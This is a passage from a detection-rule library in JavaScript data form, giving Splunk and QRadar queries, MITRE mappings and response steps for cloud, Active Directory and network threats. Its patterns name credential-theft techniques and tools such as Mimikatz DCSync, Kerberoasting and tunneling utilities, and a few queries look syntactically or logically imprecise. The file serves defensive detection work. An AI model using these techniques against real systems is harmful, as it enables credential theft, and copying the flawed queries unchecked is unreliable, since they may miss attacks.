falsePositives:{desc:"VPN split tunneling causing dual-location appearance, corporate proxy in different country, Zscaler/cloud proxy egress points",splunk:`| where NOT match(src_ip,"(?i)zscaler") AND travel_hours < 1`,qradar:`AND NOT INCIDR(sourceip,'185.46.0.0/16')`,allowlist:"Whitelist known corporate proxy/VPN egress IPs. Document global office locations."},
commonErrors:"GeoIP accuracy varies by provider. VPN egress may show incorrect location. Mobile devices switching between WiFi and cellular can cause apparent travel. Azure AD logs may have ingestion delays.",
responseActions:"1) CRITICAL — likely credential compromise. 2) Force password reset and revoke all sessions. 3) Enable/enforce MFA immediately. 4) Review all actions during suspicious session. 5) Check for inbox rules, app consent grants, data access."},

{id:"ct-2",cat:"cloud-threats",title:"MFA Disabled for Privileged User",mitre:{id:"T1556.006",name:"Modify Authentication Process: MFA",tactic:"Credential Access"},severity:"Critical",
desc:"Detects disabling of Multi-Factor Authentication for privileged accounts (Global Admin, Security Admin), which dramatically reduces account security and may indicate preparation for account takeover.",
splunk:`index=azure sourcetype=azure:aad:audit
| where Operation="Disable Strong Authentication" OR Operation="Update user" match(ModifiedProperties,"StrongAuthenticationRequirements")
| lookup privileged_users.csv user OUTPUT is_privileged
| where is_privileged="true"
| table _time, user, Operation, ModifiedProperties, Actor`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as mfa_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Azure%'
  AND (eventname ILIKE '%Disable%Strong%Authentication%' OR eventname ILIKE '%MFA%Disable%')
GROUP BY username, sourceip, qid
ORDER BY mfa_events DESC LAST 24 HOURS`,
logs:["Azure AD Audit logs","O365 Admin Activity logs","Azure AD Identity Protection","Conditional Access policy change logs"],
bestPractice:"MFA should NEVER be disabled for privileged accounts. Implement Conditional Access policies that enforce MFA regardless of per-user settings. Monitor for Conditional Access policy changes that weaken MFA requirements. Use Privileged Identity Management (PIM) for just-in-time admin access.",
falsePositives:{desc:"Authorized admin actions during MFA troubleshooting (should be temporary and documented), migration between MFA providers",splunk:`| where is_privileged="true"`,qradar:`AND NOT username = 'svc_migration'`,allowlist:"No allowlist for privileged accounts. MFA disabling should always be investigated."},
commonErrors:"Azure AD logs the operation differently for per-user MFA vs Conditional Access. Legacy authentication bypasses MFA entirely — block legacy auth protocols. QRadar may need Azure AD DSM for audit log parsing.",
responseActions:"1) CRITICAL — verify with the admin who disabled MFA. 2) Re-enable MFA immediately. 3) If unauthorized: account is compromised — reset password, revoke sessions. 4) Audit all actions by the compromised admin account. 5) Check for persistence (app registrations, service principals)."},

{id:"ct-3",cat:"cloud-threats",title:"Cloud Storage Bucket Public Exposure",mitre:{id:"T1530",name:"Data from Cloud Storage",tactic:"Collection"},severity:"Critical",
desc:"Detects when cloud storage (S3 bucket, Azure Blob, GCS bucket) access policies are changed to allow public/anonymous access, potentially exposing sensitive data to the internet.",
splunk:`index=aws sourcetype=aws:cloudtrail eventName IN ("PutBucketAcl","PutBucketPolicy","CreateBucket","PutPublicAccessBlock")
| where match(requestParameters,"(?i)(public-read|AllUsers|\\*)")
| table _time, userIdentity.arn, sourceIPAddress, eventName, requestParameters, bucketName`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as bucket_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%AWS%'
  AND (eventname ILIKE '%PutBucketAcl%' OR eventname ILIKE '%PutBucketPolicy%')
  AND (eventname ILIKE '%public%' OR eventname ILIKE '%AllUsers%')
GROUP BY username, sourceip, qid
ORDER BY bucket_events DESC LAST 24 HOURS`,
logs:["AWS CloudTrail","Azure Activity Log","GCP Cloud Audit Logs","CSPM (Cloud Security Posture Management) alerts"],
bestPractice:"Block public access at the account/organization level using S3 Block Public Access, Azure Storage firewall, or GCS uniform bucket-level access. Use CSPM tools for continuous monitoring. Any public storage change should require change management approval.",
falsePositives:{desc:"Intentionally public static website hosting buckets, CDN origin buckets, public dataset sharing",splunk:`| where NOT match(bucketName,"(?i)(static-website|cdn-origin|public-assets)")`,qradar:`AND NOT eventname ILIKE '%static-website%'`,allowlist:"Document intentionally public buckets. Alert on any new public access grant."},
commonErrors:"S3 bucket policies vs ACLs can conflict. Azure Storage access tiers add complexity. Cross-account access may appear as public access. IAM policy evaluation order matters.",
responseActions:"1) CRITICAL — assess what data is in the exposed storage. 2) Immediately remove public access. 3) Check access logs for unauthorized downloads during exposure. 4) Notify data protection/privacy team if PII was exposed. 5) Implement account-level public access blocks."},

{id:"ct-4",cat:"cloud-threats",title:"Excessive Cloud API Calls",mitre:{id:"T1580",name:"Cloud Infrastructure Discovery",tactic:"Discovery"},severity:"Medium",
desc:"Detects unusual spikes in cloud API calls from a single identity, potentially indicating automated reconnaissance, API key abuse, or compromised service principal.",
splunk:`index=aws sourcetype=aws:cloudtrail
| bin _time span=1h
| stats count dc(eventName) as unique_apis dc(eventSource) as services by userIdentity.arn, sourceIPAddress, _time
| where count > 500 AND unique_apis > 20
| table _time, userIdentity.arn, sourceIPAddress, count, unique_apis, services`,
qradar:`SELECT username, sourceip, COUNT(*) as api_calls,
  COUNT(DISTINCT destinationip) as unique_services
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%AWS%' OR LOGSOURCENAME(logsourceid) ILIKE '%Azure%'
GROUP BY username, sourceip
HAVING COUNT(*) > 500
ORDER BY api_calls DESC LAST 4 HOURS`,
logs:["AWS CloudTrail","Azure Activity Log","GCP Admin Activity logs","Cloud provider API gateway logs"],
bestPractice:"Baseline normal API call volume per identity. >500 calls/hour with >20 unique APIs indicates reconnaissance tools (ScoutSuite, Prowler, Pacu). Monitor for Describe/List/Get API calls at scale. Implement API rate limiting and CloudTrail anomaly detection.",
falsePositives:{desc:"CI/CD pipelines, infrastructure-as-code deployments (Terraform), monitoring solutions, auto-scaling operations",splunk:`| where NOT (match(userIdentity.arn,"(?i)(terraform|jenkins|github-actions|monitoring)"))`,qradar:`AND NOT username ILIKE '%terraform%'`,allowlist:"Document IaC and CI/CD service accounts with expected API patterns."},
commonErrors:"CloudTrail management events vs data events have different volumes. Some API calls are throttled and may not appear. Multi-region calls appear in each region's trail.",
responseActions:"1) Identify the calling identity and assess if legitimate. 2) Check for reconnaissance APIs (ListBuckets, DescribeInstances, GetCallerIdentity). 3) If unauthorized: revoke access keys, disable the identity. 4) Review what was discovered/accessed."},

{id:"ct-5",cat:"cloud-threats",title:"IAM Privilege Escalation",mitre:{id:"T1078.004",name:"Valid Accounts: Cloud Accounts",tactic:"Privilege Escalation"},severity:"Critical",
desc:"Detects IAM privilege escalation attempts where a user or role modifies their own permissions, creates admin-level policies, or assumes high-privilege roles without authorization.",
splunk:`index=aws sourcetype=aws:cloudtrail eventName IN ("PutUserPolicy","AttachUserPolicy","PutRolePolicy","AttachRolePolicy","CreatePolicyVersion","AssumeRole","CreateRole")
| where match(requestParameters,"(?i)(AdministratorAccess|\\*|iam:.*\\*|sts:AssumeRole)")
| table _time, userIdentity.arn, sourceIPAddress, eventName, requestParameters, errorCode`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as iam_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%AWS%'
  AND (eventname ILIKE '%PutUserPolicy%' OR eventname ILIKE '%AttachUserPolicy%'
    OR eventname ILIKE '%AttachRolePolicy%' OR eventname ILIKE '%CreatePolicyVersion%')
GROUP BY username, sourceip, qid
ORDER BY iam_events DESC LAST 24 HOURS`,
logs:["AWS CloudTrail (IAM events)","Azure AD Audit logs (Role assignments)","GCP IAM Policy Change logs","Cloud SIEM/CSPM alerts"],
bestPractice:"Self-modification of IAM permissions is the #1 cloud privilege escalation technique. Monitor for users attaching policies to themselves. Track AssumeRole calls to admin roles. Implement SCP/Permission Boundaries to prevent IAM self-elevation. Use PIM/just-in-time access.",
falsePositives:{desc:"Authorized IAM admin operations, infrastructure provisioning creating roles, CloudFormation/Terraform deploying IAM resources",splunk:`| where NOT match(userIdentity.arn,"(?i)(cloudformation|terraform|admin-iam)")`,qradar:`AND NOT username ILIKE '%cloudformation%'`,allowlist:"Only dedicated IAM admin roles should modify IAM. Track all IAM changes in change management."},
commonErrors:"IAM policy changes are global — ensure CloudTrail covers all regions. Managed policies vs inline policies require different API monitoring. AWS Organizations SCPs can prevent detection if they block CloudTrail.",
responseActions:"1) CRITICAL — determine if the identity escalated their own permissions. 2) Revert the permission change immediately. 3) If self-escalation: account is compromised — disable. 4) Audit all actions taken with elevated privileges. 5) Implement preventive controls (SCPs, Permission Boundaries)."},

{id:"ct-6",cat:"cloud-threats",title:"Service Principal Secret Added",mitre:{id:"T1098.001",name:"Account Manipulation: Additional Cloud Credentials",tactic:"Persistence"},severity:"High",
desc:"Detects addition of new credentials (secrets/certificates) to Azure AD service principals or app registrations, a common persistence technique after cloud compromise.",
splunk:`index=azure sourcetype=azure:aad:audit
| where Operation IN ("Add service principal credentials","Update application – Certificates and secrets management")
| table _time, Actor, Operation, Target, ModifiedProperties`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as sp_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Azure%'
  AND (eventname ILIKE '%service principal%credential%' OR eventname ILIKE '%application%secret%')
GROUP BY username, sourceip, qid
ORDER BY sp_events DESC LAST 24 HOURS`,
logs:["Azure AD Audit logs","Microsoft Graph API activity","Azure Resource Manager activity logs"],
bestPractice:"New secrets on existing service principals should be rare and change-managed. Monitor for secrets added to high-privilege SPs (those with directory roles or API permissions). Implement short credential lifetimes. Use managed identities instead of secrets where possible.",
falsePositives:{desc:"Automated certificate rotation, application deployment pipelines, DevOps CI/CD updating secrets",splunk:`| where NOT match(Actor,"(?i)(devops|pipeline|rotation)")`,qradar:`AND NOT username ILIKE '%pipeline%'`,allowlist:"Document SP credential rotation schedules. Alert on out-of-cycle additions."},
commonErrors:"Azure AD audit log retention is limited — ensure SIEM ingestion is timely. Service principal vs application registration have different audit events. Managed identity operations don't appear the same way.",
responseActions:"1) Verify if the secret addition was authorized. 2) If unauthorized: remove the added secret immediately. 3) Audit what the service principal has access to. 4) Check for data access using the SP. 5) Review the attacker's entry vector."},

// CATEGORY 16: ACTIVE DIRECTORY

{id:"ad-1",cat:"active-directory",title:"Kerberoasting — RC4 TGS Requests at Scale",mitre:{id:"T1558.003",name:"Kerberoasting",tactic:"Credential Access"},severity:"High",
desc:"Detects Kerberoasting attacks at scale by monitoring for multiple TGS requests using weak RC4 encryption (etype 0x17) targeting service accounts, differentiated from normal Kerberos activity by volume and encryption type.",
splunk:`index=wineventlog sourcetype=WinEventLog:Security EventCode=4769 TicketEncryptionType=0x17
| where ServiceName!="krbtgt" AND NOT match(ServiceName,"\\$$")
| bin _time span=15m
| stats dc(ServiceName) as unique_spns count values(ServiceName) as targets by TargetUserName, IpAddress, _time
| where unique_spns > 5
| eval risk=if(unique_spns>10,"CRITICAL","HIGH")
| table _time, TargetUserName, IpAddress, unique_spns, count, risk, targets`,
qradar:`SELECT sourceip, username,
  COUNT(*) as tgs_requests,
  COUNT(DISTINCT destinationip) as unique_spns
FROM events WHERE QIDNAME(qid) ILIKE '%Kerberos Service Ticket%Granted%'
  AND username NOT ILIKE '%$'
GROUP BY sourceip, username
HAVING COUNT(*) > 10
ORDER BY tgs_requests DESC LAST 2 HOURS`,
logs:["Windows Security 4769","DC Kerberos logs","Network Kerberos traffic analysis"],
bestPractice:"RC4 (0x17) TGS requests for multiple non-machine SPNs is the definitive Kerberoasting signal. Set service account passwords to 25+ characters. Migrate to Group Managed Service Accounts (gMSA). Enable AES-only Kerberos for service accounts where possible.",
falsePositives:{desc:"Legacy applications using RC4 Kerberos, monitoring systems performing SPN discovery",splunk:`| where unique_spns > 5 AND NOT TargetUserName IN ("svc_monitor")`,qradar:`AND NOT username = 'svc_monitor'`,allowlist:"Baseline normal TGS patterns per user. Flag bulk RC4 requests."},
commonErrors:"TicketEncryptionType field may need custom TA extraction. Machine accounts make legitimate TGS requests. AES (0x12) requests are normal. 4769 volume is high on domain controllers.",
responseActions:"1) Identify targeted SPNs — these accounts are at risk. 2) Immediately change passwords for all targeted service accounts (25+ chars). 3) Convert to gMSA where possible. 4) Investigate the requesting account for compromise. 5) Monitor for use of cracked credentials."},

{id:"ad-2",cat:"active-directory",title:"DCSync — Directory Replication from Non-DC",mitre:{id:"T1003.006",name:"DCSync",tactic:"Credential Access"},severity:"Critical",
desc:"Detects DCSync attacks by identifying directory replication requests (DS-Replication-Get-Changes-All) originating from IP addresses that are NOT domain controllers.",
splunk:`index=wineventlog sourcetype=WinEventLog:Security EventCode=4662
  Properties="*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*"
| lookup dc_ips.csv src_ip as SubjectIP OUTPUT is_dc
| where is_dc!="true" AND NOT match(SubjectUserName,"\\$$")
| table _time, SubjectUserName, SubjectIP, ComputerName`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as repl_events
FROM events WHERE QIDNAME(qid) ILIKE '%Directory Service%Replication%'
  AND NOT INCIDR(sourceip,'10.0.0.1/32')
  AND NOT INCIDR(sourceip,'10.0.0.2/32')
  AND username NOT ILIKE '%$'
GROUP BY sourceip, username, qid
ORDER BY repl_events DESC LAST 24 HOURS`,
logs:["Windows Security 4662","DC replication logs","Network traffic on RPC/DRS ports"],
bestPractice:"Maintain an updated list of DC IPs. ANY replication request from a non-DC is DCSync (Mimikatz lsadump::dcsync). This is a zero-false-positive detection when DC IP list is accurate. Monitor replication GUIDs: 1131f6aa (Get-Changes), 1131f6ad (Get-Changes-All).",
falsePositives:{desc:"Azure AD Connect servers (MSOL_ account), ADFS servers with replication rights",splunk:`| where NOT match(SubjectUserName,"(?i)(MSOL_|AADConnect)")`,qradar:`AND NOT username ILIKE 'MSOL_%'`,allowlist:"Only DCs and Azure AD Connect. Everything else is malicious."},
commonErrors:"Must maintain accurate DC IP list. Azure AD Connect legitimately replicates. Event 4662 requires advanced audit policy. The replication GUID must be captured in full.",
responseActions:"1) CRITICAL — total domain credential compromise. 2) Isolate source immediately. 3) Reset KRBTGT twice (10-12h apart). 4) Plan domain-wide password reset. 5) Full IR with domain recovery playbook."},

{id:"ad-3",cat:"active-directory",title:"Golden Ticket Usage Indicators",mitre:{id:"T1558.001",name:"Golden Ticket",tactic:"Credential Access"},severity:"Critical",
desc:"Detects Golden Ticket usage by identifying TGTs with anomalous properties: unusually long ticket lifetimes, mismatched domain names, or TGT usage without corresponding AS-REQ.",
splunk:`index=wineventlog sourcetype=WinEventLog:Security EventCode=4769
| join type=left TargetUserName [search index=wineventlog EventCode=4768
  | stats latest(_time) as tgt_time by TargetUserName, IpAddress]
| eval time_diff=_time - tgt_time
| where isnull(tgt_time) OR time_diff > 36000
| table _time, TargetUserName, IpAddress, ServiceName, tgt_time, time_diff`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as golden_events
FROM events WHERE QIDNAME(qid) ILIKE '%Kerberos%'
  AND (eventname ILIKE '%4769%' OR eventname ILIKE '%Service Ticket%')
GROUP BY sourceip, username, qid
HAVING COUNT(*) > 50
ORDER BY golden_events DESC LAST 24 HOURS`,
logs:["Windows Security 4768/4769","DC Kerberos operational logs","Network Kerberos traffic","KRBTGT account monitoring"],
bestPractice:"Golden Tickets have: 10-year default lifetime, SID of any user, domain admin group membership. Detect by: TGS requests without prior TGT (4769 without 4768), ticket lifetime anomalies, KRBTGT hash mismatch. Reset KRBTGT every 180 days as preventive measure.",
falsePositives:{desc:"Kerberos ticket renewal creating long-lived sessions, cached tickets after reboot",splunk:`| where isnull(tgt_time) AND NOT match(TargetUserName,"(?i)svc_")`,qradar:`AND NOT username ILIKE 'svc_%'`,allowlist:"Service accounts may have long ticket lifetimes. Focus on user accounts using tickets without TGT."},
commonErrors:"Correlating 4768 and 4769 across DCs requires comprehensive log collection. Golden Tickets forged with correct encryption and correct SID are very hard to detect. KRBTGT must be reset TWICE to invalidate all tickets.",
responseActions:"1) CRITICAL — KRBTGT hash is compromised. 2) Reset KRBTGT password twice (10-12h between resets). 3) Isolate the source. 4) Assume all domain credentials are accessible. 5) Full domain recovery IR."},

{id:"ad-4",cat:"active-directory",title:"AdminSDHolder Modification",mitre:{id:"T1484",name:"Domain Policy Modification",tactic:"Defense Evasion"},severity:"Critical",
desc:"Detects modifications to the AdminSDHolder container, which controls the ACL template for all administrative accounts. Attackers modify this to gain persistent admin access that survives permission resets.",
splunk:`index=wineventlog sourcetype=WinEventLog:Security EventCode=5136
  ObjectDN="*AdminSDHolder*"
| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue, OperationType`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as sdh_events
FROM events WHERE eventname ILIKE '%AdminSDHolder%'
  AND QIDNAME(qid) ILIKE '%Directory Service%Modified%'
GROUP BY username, sourceip, qid
ORDER BY sdh_events DESC LAST 24 HOURS`,
logs:["Windows Security 5136 (DS Object Modified)","AD DS audit logs","AdminSDHolder ACL monitoring"],
bestPractice:"AdminSDHolder modifications should be extremely rare — only during initial domain setup or migration. The SDProp process propagates AdminSDHolder ACLs every 60 minutes. Any modification grants persistent admin access. Monitor and compare AdminSDHolder ACL against known-good baseline.",
falsePositives:{desc:"Domain setup/migration activities, authorized security hardening of admin ACLs",splunk:`| where NOT SubjectUserName IN ("admin_tier0")`,qradar:`AND NOT username = 'admin_tier0'`,allowlist:"Only Tier-0 admin accounts during documented change windows."},
commonErrors:"Event 5136 requires advanced AD audit policy. The attribute modification details may be in binary/SID format. SDProp runs every 60min so unauthorized changes persist within one cycle.",
responseActions:"1) CRITICAL — persistent privilege escalation. 2) Immediately revert AdminSDHolder ACL. 3) Force SDProp run to propagate correct ACLs. 4) Identify the attacker and their access. 5) Full domain investigation."},

{id:"ad-5",cat:"active-directory",title:"Domain Trust Enumeration / Modification",mitre:{id:"T1482",name:"Domain Trust Discovery",tactic:"Discovery"},severity:"High",
desc:"Detects enumeration or modification of Active Directory domain trusts, used by attackers to discover and exploit trust relationships for cross-domain lateral movement.",
splunk:`index=wineventlog (sourcetype=WinEventLog:Sysmon EventCode=1 OR sourcetype=WinEventLog:Security EventCode=4688)
| where match(CommandLine,"(?i)(nltest.*domain_trusts|nltest.*all_trusts|Get-ADTrust|Get-DomainTrust|dsquery.*trustedDomain)")
| table _time, ComputerName, User, CommandLine`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as trust_events
FROM events WHERE (eventname ILIKE '%nltest%domain_trust%' OR eventname ILIKE '%Get-ADTrust%'
  OR eventname ILIKE '%trustedDomain%')
GROUP BY sourceip, username, qid
ORDER BY trust_events DESC LAST 24 HOURS`,
logs:["Sysmon Event 1","Windows Security 4688","AD DS audit for trust object access","LDAP query logs for trustedDomain objects"],
bestPractice:"Trust enumeration (nltest /domain_trusts) from non-admin workstations indicates reconnaissance. Trust modification (netdom trust) indicates advanced attack. Monitor for cross-domain SID History exploitation after trust discovery.",
falsePositives:{desc:"IT administrators managing domain trusts, migration projects discovering trust topology",splunk:`| where NOT User IN ("admin_t0","svc_migration")`,qradar:`AND NOT username IN ('admin_t0','svc_migration')`,allowlist:"Only Tier-0 admins should query or modify domain trusts."},
commonErrors:"nltest.exe is a legitimate admin tool. PowerView's Get-DomainTrust uses LDAP queries that may not generate process events. Trust enumeration is suspicious when combined with other recon.",
responseActions:"1) Determine if the user is an authorized domain admin. 2) If not: investigate as post-compromise reconnaissance. 3) Check for subsequent cross-domain activity. 4) Review trust configurations for security weaknesses."},

{id:"ad-6",cat:"active-directory",title:"GPO Creation/Modification — Suspicious",mitre:{id:"T1484.001",name:"Domain Policy Modification: Group Policy",tactic:"Defense Evasion"},severity:"High",
desc:"Detects creation or modification of Group Policy Objects with suspicious settings such as immediate scheduled tasks, logon scripts, or software deployment that could be used for mass deployment of malware.",
splunk:`index=wineventlog sourcetype=WinEventLog:Security (EventCode=5136 OR EventCode=5137)
  ObjectClass="groupPolicyContainer"
| eval gpo_action=case(EventCode=5137,"GPO Created",EventCode=5136,"GPO Modified")
| stats count values(gpo_action) as actions by SubjectUserName, ObjectDN, _time
| table _time, SubjectUserName, gpo_action, ObjectDN, count`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as gpo_events
FROM events WHERE (QIDNAME(qid) ILIKE '%Group Policy%' OR eventname ILIKE '%groupPolicyContainer%')
  AND (QIDNAME(qid) ILIKE '%Created%' OR QIDNAME(qid) ILIKE '%Modified%')
GROUP BY username, sourceip, qid
ORDER BY gpo_events DESC LAST 24 HOURS`,
logs:["Windows Security 5136/5137","SYSVOL file monitoring","GPO versioning logs","Group Policy operational logs"],
bestPractice:"Monitor SYSVOL changes alongside directory events. New GPOs deploying immediate scheduled tasks or scripts are high-risk. Track GPO GUIDs to correlate directory events with file changes. Implement change management for all GPO modifications.",
falsePositives:{desc:"Authorized GPO changes, AGPM workflow approvals, automated GPO deployments from approved tools",splunk:`| where NOT SubjectUserName IN ("admin_gpo","svc_agpm")`,qradar:`AND NOT username IN ('admin_gpo','svc_agpm')`,allowlist:"Approved GPO admin accounts during change windows only."},
commonErrors:"5136 events show ObjectDN with GPO GUID, not friendly name. SYSVOL replication can cause duplicate events. Multiple 5136 events for a single GPO change. QRadar may need custom parsing for GPO details.",
responseActions:"1) Identify which GPO changed and what settings were modified. 2) Cross-reference with change management. 3) If unauthorized: revert the GPO immediately. 4) Assess deployment scope (what OUs are affected). 5) Check for malicious scripts in SYSVOL."},

// ═══════════════════════════════════════
// CATEGORY 17: NETWORK ANOMALIES
// ═══════════════════════════════════════
{id:"na-1",cat:"network-anomalies",title:"Non-Standard Protocol on Known Port",mitre:{id:"T1571",name:"Non-Standard Port",tactic:"Command and Control"},severity:"Medium",
desc:"Detects protocol mismatches where non-expected protocols are observed on well-known ports (e.g., SSH on port 443, non-HTTP traffic on port 80), indicating tunneling or C2 communication.",
splunk:`index=firewall sourcetype=firewall
| where (dest_port=443 AND NOT app IN ("ssl","https","tls")) OR (dest_port=80 AND NOT app IN ("http","web")) OR (dest_port=53 AND NOT app IN ("dns"))
| stats count dc(dest_ip) as targets by src_ip, dest_port, app, _time
| table _time, src_ip, dest_port, app, targets, count`,
qradar:`SELECT sourceip, destinationip, destinationport,
  protocolname(protocolid) as protocol, COUNT(*) as events
FROM events WHERE (destinationport=443 AND protocolname(protocolid) NOT IN ('TCP'))
  OR (destinationport=80 AND protocolname(protocolid) NOT ILIKE '%HTTP%')
GROUP BY sourceip, destinationip, destinationport, protocolid
ORDER BY events DESC LAST 24 HOURS`,
logs:["Next-gen firewall with app identification","IDS/IPS with protocol detection","Zeek protocol analysis","Network flow with DPI"],
bestPractice:"Next-gen firewalls that perform deep packet inspection can identify application-layer protocol mismatches. SSH over port 443 is common for C2 tunneling. DNS over non-53 ports may indicate DNS tunneling. Focus on outbound connections to external IPs.",
falsePositives:{desc:"Legitimate VPN services on non-standard ports, developer tools, some cloud services using custom port configurations",splunk:`| where NOT dest_ip IN ("10.0.0.0/8") AND count > 5`,qradar:`AND NOT INCIDR(destinationip,'10.0.0.0/8')`,allowlist:"Document approved non-standard port usage. Block protocol mismatches at the firewall."},
commonErrors:"Basic firewalls can't do protocol identification. Encrypted traffic looks the same regardless of application layer protocol. QRadar may need flow-based analysis for protocol identification.",
responseActions:"1) Identify the application using the wrong port. 2) Check if it's a known tunneling tool (chisel, ngrok, socat). 3) If C2 tunneling: isolate and investigate. 4) Block the traffic at the firewall."},

{id:"na-2",cat:"network-anomalies",title:"TOR Exit Node Communication",mitre:{id:"T1090.003",name:"Proxy: Multi-hop Proxy",tactic:"Command and Control"},severity:"High",
desc:"Detects connections to or from known TOR exit nodes, indicating potential anonymous browsing, C2 communication, or data exfiltration through the TOR network.",
splunk:`index=firewall sourcetype=firewall
| lookup tor_exit_nodes.csv dest_ip OUTPUT is_tor
| where is_tor="true"
| stats count dc(dest_port) as ports values(dest_port) as port_list by src_ip, dest_ip, _time
| table _time, src_ip, dest_ip, ports, port_list, count`,
qradar:`SELECT sourceip, destinationip, destinationport,
  COUNT(*) as tor_connections
FROM events WHERE destinationip IN (SELECT sourceip FROM reference_set WHERE name='TOR_Exit_Nodes')
GROUP BY sourceip, destinationip, destinationport
ORDER BY tor_connections DESC LAST 24 HOURS`,
logs:["Firewall logs","Proxy logs","Threat intelligence TOR exit node lists","DNS logs (resolving .onion)"],
bestPractice:"Maintain updated TOR exit node IP list (updated daily from torproject.org). Block TOR at the network perimeter. Also monitor for TOR bridge relay connections. Check for .onion domain DNS queries. TOR from corporate endpoints is almost always policy-violating.",
falsePositives:{desc:"Security researchers accessing TOR for threat intelligence, authorized pentest using TOR for anonymity",splunk:`| where NOT src_ip IN ("10.0.99.10")`,qradar:`AND NOT sourceip = '10.0.99.10'`,allowlist:"Only authorized security research IPs. No general exemptions."},
commonErrors:"TOR exit node lists change frequently — automate updates. TOR bridges aren't in public lists. Obfs4/meek transports make TOR traffic look like normal HTTPS. QRadar reference set must be automated.",
responseActions:"1) Identify the source user. 2) Determine if TOR usage is authorized. 3) Block TOR exit node IPs at perimeter. 4) Investigate what was accessed via TOR. 5) If C2: isolate and investigate for compromise."},

{id:"na-3",cat:"network-anomalies",title:"High Connection Rate — DDoS Indicator",mitre:{id:"T1499",name:"Endpoint Denial of Service",tactic:"Impact"},severity:"High",
desc:"Detects abnormally high connection rates from internal or external sources that may indicate DDoS attacks, port scanning, or worm propagation.",
splunk:`index=firewall sourcetype=firewall
| bin _time span=1m
| stats count dc(dest_ip) as targets dc(dest_port) as ports by src_ip, _time
| where count > 1000 OR targets > 50 OR ports > 100
| table _time, src_ip, count, targets, ports`,
qradar:`SELECT sourceip, COUNT(*) as connections,
  COUNT(DISTINCT destinationip) as targets,
  COUNT(DISTINCT destinationport) as ports
FROM events WHERE CATEGORYNAME(highlevelcategory) = 'Firewall'
GROUP BY sourceip
HAVING COUNT(*) > 1000
ORDER BY connections DESC LAST 1 HOURS`,
logs:["Firewall connection logs","Network flow data","IDS/IPS","Load balancer metrics"],
bestPractice:">1000 connections/minute from a single source is abnormal for most scenarios. Distinguish between external DDoS and internal scanning/worm. Track connection rate trends for baselining. Implement rate limiting at the network edge.",
falsePositives:{desc:"Load testing, authorized scanning, content delivery during peak, legitimate high-traffic applications",splunk:`| where NOT src_ip IN ("10.0.5.10","load-test.internal")`,qradar:`AND NOT sourceip = '10.0.5.10'`,allowlist:"Document authorized high-traffic sources."},
commonErrors:"Connection counting depends on firewall session tracking. Stateless firewalls may count differently. DDoS from distributed sources won't show single-IP spike.",
responseActions:"1) Determine if external (DDoS) or internal (scan/worm). 2) For DDoS: activate DDoS mitigation (CDN, scrubbing). 3) For internal: isolate the source and check for worm/malware. 4) Contact ISP for upstream filtering if needed."},

{id:"na-4",cat:"network-anomalies",title:"ICMP Data Exfiltration (Large Payload)",mitre:{id:"T1048.003",name:"Exfiltration Over Unencrypted Non-C2 Protocol",tactic:"Exfiltration"},severity:"Medium",
desc:"Detects potential data exfiltration via ICMP by identifying echo request/reply packets with unusually large payloads (normal ping is 32-64 bytes, exfiltration uses larger payloads).",
splunk:`index=firewall sourcetype=firewall protocol=icmp
| where bytes > 100
| bin _time span=30m
| stats sum(bytes) as total_bytes count by src_ip, dest_ip, _time
| where total_bytes > 10000 OR count > 100
| eval total_KB=round(total_bytes/1024,1)
| table _time, src_ip, dest_ip, total_KB, count`,
qradar:`SELECT sourceip, destinationip,
  SUM(LONG(bytes)) as total_bytes, COUNT(*) as icmp_count
FROM events WHERE protocolname(protocolid) = 'ICMP'
  AND LONG(bytes) > 100
GROUP BY sourceip, destinationip
HAVING SUM(LONG(bytes)) > 10000
ORDER BY total_bytes DESC LAST 4 HOURS`,
logs:["Firewall logs with ICMP payload sizes","IDS/IPS","Network flow data","Full packet capture"],
bestPractice:"Normal ICMP echo is 32-64 bytes. Payloads >100 bytes with high frequency indicate data tunneling (icmpsh, icmp_tunnel). Consider blocking large ICMP packets (>128 bytes) at the perimeter. Monitor ICMP payload entropy for encoded data.",
falsePositives:{desc:"MTU discovery (PMTUD) using large ICMP, network diagnostic tools, traceroute with large packets",splunk:`| where NOT match(dest_ip,"(?i)(8.8.8.8|1.1.1.1)") AND total_KB > 10`,qradar:`AND NOT destinationip IN ('8.8.8.8','1.1.1.1')`,allowlist:"Whitelist monitoring tools. Block large ICMP at perimeter."},
commonErrors:"Many firewalls don't log ICMP payload sizes. Flow data may not distinguish ICMP types. Full packet capture needed for payload analysis.",
responseActions:"1) Analyze ICMP payloads for encoded data. 2) Block large ICMP at perimeter. 3) Investigate source and destination. 4) Check for ICMP tunneling tools on the source."},

{id:"na-5",cat:"network-anomalies",title:"Inbound Connection to Unusual Port",mitre:{id:"T1571",name:"Non-Standard Port",tactic:"Command and Control"},severity:"Medium",
desc:"Detects inbound connections from the internet to non-standard ports on internal hosts, which may indicate backdoors, reverse shells, or unauthorized services exposed to the internet.",
splunk:`index=firewall sourcetype=firewall direction=inbound action=allowed
| where NOT dest_port IN (80,443,22,25,53,110,143,993,995,3389,8080,8443)
| where NOT cidrmatch("10.0.0.0/8",src_ip) AND cidrmatch("10.0.0.0/8",dest_ip)
| stats count dc(src_ip) as unique_sources by dest_ip, dest_port, _time
| table _time, dest_ip, dest_port, unique_sources, count`,
qradar:`SELECT destinationip, destinationport,
  COUNT(DISTINCT sourceip) as unique_sources, COUNT(*) as connections
FROM events WHERE eventdirection = 'R2L'
  AND NOT destinationport IN (80,443,22,25,53,3389)
  AND NOT INCIDR(sourceip,'10.0.0.0/8')
GROUP BY destinationip, destinationport
HAVING COUNT(*) > 0
ORDER BY connections DESC LAST 24 HOURS`,
